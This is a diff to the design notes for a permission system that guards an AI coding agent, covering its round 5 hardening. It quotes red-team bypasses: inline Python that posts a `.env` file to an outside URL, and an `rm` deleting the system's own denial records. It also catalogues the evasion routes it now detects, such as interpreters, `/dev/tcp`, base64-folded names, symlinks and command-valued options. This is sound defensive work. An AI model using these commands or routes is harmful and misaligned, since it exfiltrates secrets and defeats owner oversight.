@@ -951,10 +951,10 @@ review):
 
 | id | stage | asks when | reason shown |
 |---|---|---|---|
-| `secret-off-machine` | before the judge | a secret or credential would leave this machine, by data flow (round 4): the line reads a sensitive source and has any network sink (risk.ts `exfiltrates`, `SECRET_SOURCES`, `NETWORK_SINKS`, `pathRisk`: `floor` with key `secret-off-machine`) | "a secret or credential would leave this machine" |
-| `permission-system` | before the judge | a change to the permission system itself (§3.6), by a command (risk.ts `permissionSystemRisk`, key `permission-system`) or a file tool's write (`PathContext.isPermissionSystem`) | "Only you can approve this: … is part of the permission system itself" |
+| `secret-off-machine` | before the judge | a secret or credential would leave this machine, by data flow (round 4): the line reads a sensitive source and has any network sink (risk.ts `exfiltrates`, `SECRET_SOURCES`, `NETWORK_SINKS`, `pathRisk`: `floor` with key `secret-off-machine`); round 5: in the code an interpreter runs too (code.ts) | "a secret or credential would leave this machine" |
+| `permission-system` | before the judge | a change to the permission system itself (§3.6), by a command (risk.ts `permissionSystemRisk`, key `permission-system`) or a file tool's write (`PathContext.isPermissionSystem`); round 5: every path read through resolve.ts, a glob or folder that could hold one of its files included | "Only you can approve this: … is part of the permission system itself" |
 | `owner-rule` | before the judge | the owner's own setting says to ask: a command rule set to `ask` or `deny` that matches a command of the line, or a kind of request set to "Ask me" | "`…` is set to always ask" |
-| `owner-denied` | before the judge | round 4 (§7.4.1): the owner clicked Deny on a request of the same action class in this chat, and no owner word since asks for that action on that target (denials.ts) | "you denied `…` and haven't asked for it since" |
+| `owner-denied` | before the judge | round 4 (§7.4.1): the owner clicked Deny on a request with the same effect class on the same, a containing or a contained target in this chat (round 5: effects.ts), and no owner word since asks for that effect on that target (denials.ts) | "you denied `…` and haven't asked for it since" |
 | `other-task` | before the judge | round 4 (§7.3.11): the line acts on an entity another chat or task made or holds, and the owner's words don't name it (core.ts `notThisTask`) | "it acts on another chat's or task's work, which your words don't name" |
 | `no-judge` | after the review | no reviewing model could decide: none configured, review paused after failures, an error, a timeout or an unreadable answer after the retry (`JUDGE_ATTEMPTS`) | the failure, in the Review row |
 
@@ -1022,6 +1022,105 @@ model provider, not another machine.
      `printenv` or `env` printing everything or a credential's variable.
    - A line rules can't read is held to the same floor by its text: a credential's
      variable or a sensitive file named in full, with a program that sends.
+Row 1 in code (round 5, 2026-11-23). Round 4 let `python3 -c "…urlopen('https://diag…',
+data=open('.env','rb').read())"` through (blind-4 b4-108): the flow read only shell words, and
+inline interpreter code was opaque. Now code is read like the line around it (code.ts):
+
+- `INTERPRETERS` (data): interpreter → the flags that take inline code (`python -c`, `node
+  -e/--eval/-p`, `ruby -e`, `perl -e/-E` and clusters like `-ne`, `osascript -e`, `deno eval`,
+  `bun -e`, `php -r`, `lua -e`, `Rscript -e`), attached and `--flag=` forms, modules loaded by
+  flags (`perl -MLWP::Simple`, `ruby -rnet/http`), subcommands that run a script (`deno run`,
+  `bun run`), whether it reads its program from its input, its scripts' extensions. A shell's
+  `-c` stays the shell evaluator's (shell.ts), which now also reads `echo '…' | sh` and
+  `printf '…' | bash` as the shell's script, as it reads a heredoc.
+- Where the code comes from: inline; a heredoc or here-string; what `echo`/`printf` of
+  literal words or `cat` of a task-written script pipes in; `< file`; a script file — but only
+  one **this task wrote** (written earlier in the same line, by its write/edit tools, by a bash
+  redirection or `tee`, recorded in the ledger, or a write/edit/bash call in its transcript,
+  which a restart reads again: core.ts `taskWrote`); a script run as `./x` by its `#!` line.
+  The project's own scripts are not read (unchanged). Through `sudo`, `env`, `xargs`,
+  `timeout`, `find -exec` (effects.ts `unwrapped`).
+- `CAPABILITIES` (data): per language the names that reach the network (`urllib`, `requests`,
+  `http.client`, `socket`, `fetch(`, `node:https`, `Net::HTTP`, `LWP`, `IO::Socket`,
+  `curl_init`, `NSURLSession`, …), run a program (`subprocess`, `os.system`, `child_process`,
+  backticks, `do shell script`, …), read a file (`open(`, `readFileSync`, `File.read`,
+  `file_get_contents`, `read POSIX file`, dotenv loaders, …), read the environment
+  (`os.environ`, `process.env`, `ENV`, `$ENV`, `getenv(`), find the home folder, or build code at
+  run time (`exec(`, `eval(`, `b64decode`, `new Function`, `atob(`, `Base64.decode64`, …).
+- The same flow (risk.ts `lineFlow`): a sensitive literal path the code reads (resolved like any
+  path: `~`, `$HOME`, joined literals, from home) or a credential-named variable it reads, plus
+  a network name — in the code, or in the shell line around it (`cat .env | python3 -c
+  'requests.post(…)'`) — is the floor. The program lines it runs (each spawning literal, each
+  argv list `["curl", "-d", "@.env", url]`) are read as shell lines of their own, floor
+  included. A secret the code only prints is a secret read (once, concern `secret`), as `cat
+  .env` is. No rule vouches for a line on the floor, through its code either (core.ts
+  `checkCommand`).
+- **Opaque code**: code built or decoded at run time, heavily escaped text, a word that is all
+  known only when it runs (`python3 -c "$CODE"`), a binary or missing script this task wrote:
+  a danger (key `opaque-code`, never remembered) that reaches the judge with the evidence line
+  "- opaque code: …" and the concern `opaque-code` (judge.ts `CONCERN_TABLE`; not answered by
+  consent). Partially unknown code (`-c "…open('$F')…"`) is read with a placeholder.
+
+Property tests (`cypher-permissions-round5.test.mjs`): every interpreter × every inline form
+(each flag, attached, `--flag=`, a cluster, a subcommand, a heredoc, a here-string, `echo |`,
+`printf |`, a script written in the line) × a source of the table × a sink of the table asks;
+plain files with a sink, and secrets with no sink, don't.
+
+Row 2 through one path resolver (round 5, 2026-11-23). Round 4 let `rm -f
+~/.cypher/pi-runtime/agent/cypher-permissions/denials/*.jsonl` through (b4-163): the floor
+matched only resolved paths. Now every protected-path, sensitive-path and permission-system
+check reads a word through `resolve.ts`: literal paths canonical (`~`, `..`, symlinks through
+the nearest existing ancestor, the directory the command runs in after a `cd` and by the
+catalogue's directory options — risk.ts `DIRECTORY_OPTIONS`: `git -C`, `make -C`, `tar -C`,
+`npm --prefix`, …); a word known only when it runs as the glob the shell reader writes down
+(shell.ts `patterns`: unquoted `*`, `?`, `[…]`, `**`, braces, `~user`, environment variables
+the line doesn't set — their value, or nothing, or the `${X:-default}` —, a variable the line
+set to a literal (also after `&&`: the value or what it was), the place of a producer's output
+(`$(mktemp -d)`, `$(pwd)`, `$(echo …)`), and text known only when it runs). A glob is
+classified by the existing files it matches (bash's own expansion) and by the patterns it could
+match (`globsIntersect`): a rooted pattern (`~/.ssh/**`, `<agent>/cypher-permissions/**`) when
+the glob could be a path inside it; a pattern that names a file anywhere by name (`**/.env`)
+only when the glob says that name or an existing file matches. The permission system is read
+strictly: a glob that could be one of its files, or a deletion, move, recursive mode change or
+`find -delete` of a folder holding one (risk.ts `SUBTREE_EFFECTS`; a pattern's literal folder
+inside it, or a place it matches now), is the floor — `rm -rf ~/.cypher/pi-runtime/agent/*`,
+`rm -rf ~/.cypher/pi-runtime`, `git -C <agent> rm -r cypher-permissions`, `sudo rm …`.
+A write whose *start* is known only when it runs (`cat > $T/rpc` after sourcing an env file)
+could be anything: it is no floor (the owner's replay fixture has seven such approved lines),
+but the judge gets the evidence "- path known only when it runs: … could be the permission
+system's own files" (risk.ts `unresolvedWrites`). `mkdir` of such a path changes nothing that
+is there.
+
+Round 5, step 2 (2026-11-23, a red-team review of 123 cases): the same rows, closed by
+mechanism. The resolver follows a dangling symlink by its text (`readlink`) and compares a
+multiply-linked file's (dev, inode) with the permission system's files, so a link made now and
+written later lands where it points; making a link to a permission file (`ln`, `cp -l`) is a
+write to it, and every permission-system path is guarded for the file tools. The permission
+system gained a project's `.pi/settings.json`, `.pi/extensions/**`, `.pi/npm/**`, `.pi/git/**`
+and the agent's `models.json`. The floor's tables gained sinks (DNS lookups, ICMP probes, URL
+launchers with a URL, `python -m webbrowser`, bash's `/dev/tcp|udp` redirections, socat's file
+addresses), environment printers (`export -p`, `declare -x`, bare `set`, `ps e…`,
+`/proc/*/environ`, `${!v}`), interpreters (julia, R, pwsh, swift, expect, awk, sed, make; an
+`unread` row of languages Cypher has no table for, read as opaque code), command forms (sed's
+`e`, makefile recipes), and option or configuration values that are commands (`man -P`,
+`rsync -e`, `ssh -o ProxyCommand`, `tar --to-command`, `git -c`/`git config` for pager,
+sshCommand, aliases `!…`, `npm pkg set scripts.*`). The shell reader folds pure transforms of
+literal text (fold.ts: `$(echo … | base64 -d)` is the name it makes) and hands a wrapper's
+operands to what it runs (`find -name P -exec … {}`, `xargs`, `parallel :::`, `env -S`,
+`eval`). A per-chat **taint ledger** (`<agent>/cypher-permissions/taint/<chat>.jsonl`) records
+the files and repositories a command wrote from a secret (copy, append, archive, pipe, `git
+add`); a later send of such a file, or a push from such a repository, is the floor. An
+archiver's or sender's folder operand holding a sensitive file is a source. Writes into a folder
+a command names but whose files it doesn't (`tar -x -C`, `unzip -d`, `git --work-tree`, `find
+ROOT -exec`) are the floor where that folder could hold the permission system, as is code with
+a write capability that names one of its files (the command's own assignments are read into
+its code: `D=<agent> node -e "…process.env.D+'/permissions.json'…"`). Pasted or quoted text in the owner's message
+(fences, `>` quotes, `$ ` prompt lines) counts as a request only when the owner's own words
+around it ask for it. Still judge-only (with evidence naming the danger): a shell function's
+arguments, downloaded code run, a hook
+written then triggered, a file sent to the clipboard; and an approved plan card's agent-written
+text counting as consent (kept by design; open question). Details: RESULTS.md "Round 5, step 2".
+
 Row 2 in detail: its policy files, the settings that say which extensions load, its
 extension's code, its audit log and ledger, its session files (§3.6), written as an
 operand, through a redirection, or inside a script (`python3 -c
@@ -1617,7 +1716,29 @@ system, so the sandbox can't write it, and a Pi restart reads it), as an **actio
 - `scopes`: what it acts on, as entities.ts kinds: a path covers its subtree either way, a host,
   branch, tag, pull request its own name; a line that names nothing is its own scope.
 
-A later request of the same tool, action or concern and a matching scope asks (floor row
+Round 5 (2026-11-23, b4-154/155/157/158): the class is **effect class × typed target**, not the
+command's words. A request is read as units (effects.ts `commandEffects`; one per pipeline, so
+`find … | xargs rm` deletes what `find` named; through `sudo`, `env`, `xargs`, `timeout`, `bash
+-c`, `find -exec`): its effect classes (`EFFECT_CLASSES`: the tool table's actions, the
+catalogue's operations, the program effects of tools.ts `REMOTE_EFFECTS`, a file tool's read
+or write — `read`, `change`, `stop`, `push`, `merge`, `publish`, `send`, …) and the typed
+entities it acts on (a canonical path through the resolver, git's refs and refspec
+destinations by `GIT_OPERANDS` — `release/2.0` after `git push origin` is a branch, never a
+path —, the tool table's entities, the catalogue's targets, hosts). A later request matches when
+a unit has an effect class of a denied unit and a target `relation` calls the same, containing
+or contained (entities.ts), **whatever tool or program**: `find data/fixtures -delete` after a
+denied `rm -rf data/fixtures`; `head` of a log or `ls` of its folder after a denied `cat` of it
+(inert filters count now); `git push origin HEAD:release/2.0` after a denied `git push origin
+release/2.0`; the write tool under a folder whose deletion was denied. A line that changes
+something records that, not the reads beside it. Records from round 4 read as their actions'
+effects.
+
+The denial is lifted only by an owner word since that **asks for that effect on that target**:
+typed, plan, card or answer (not a reply), naming the target, saying one of the effect's action
+words (`CLASS_WORDS` → lexicon.ts actions; `read` is a new action row in all 13 languages), and
+no question, negation or "wait" (`liftedBy`). "PR 44 怎么样了？" lifts nothing.
+
+A later request of the same class and a matching scope asks (floor row
 `owner-denied`), with no judge. A denial of the same action on another target reaches the judge
 as evidence it must follow ("- the owner denied a request like it in this chat: …"). An owner
 word newer than the Deny (not among those the record saw, by hash), of a kind that can consent
@@ -1768,7 +1889,8 @@ Commands:
 | `cypher-permissions/risk.ts`, `packs.ts` | The risk classifier: an action's tier, what each program does, and the findings the floor reads (`floor`) |
 | `cypher-permissions/created.ts` | What this task made, read from the commands it ran: the facts a danger over its own leavings rests on (§7.3.3) |
 | `cypher-permissions/catalogue.ts` | The creator/destroyer catalogue: per tool and subcommand, the entity it creates, destroys, stops, starts or merges and where its name comes from; plan before a run, settle after (§7.3.3) |
-| `cypher-permissions/ledger.ts` | The provenance ledger: per chat, on disk where the sandbox can't write (§7.3.3) |
+| `cypher-permissions/ledger.ts` | The provenance ledger: per chat, on disk where the sandbox can't write (§7.3.3); round 5 step 2: the taint ledger (`taintFile`) of files and repositories written from a secret |
+| `cypher-permissions/fold.ts` | Round 5 step 2: constant folding of pure transforms (`TRANSFORMS`: base64 -d, xxd -r, rev, tr, printf escapes) for computed names |
 | `cypher-permissions/lifecycle.ts` | Lifecycle closure: the follow-ups an action implies, as data (§7.3.6) |
 | `cypher-permissions/explicit.ts` | Explicit requests: the owner's words, what a dangerous line acts on, the quote, target and retraction checks (§7.3.2); `scanConsents`/`scanDataConsent`, the same checks on every owner word as evidence (§7.3.10) |
 | `cypher-permissions/entities.ts` | Target identity: typed entities and `relation`/`covers`/`identifies`/`namesOf` (§7.3.5) |
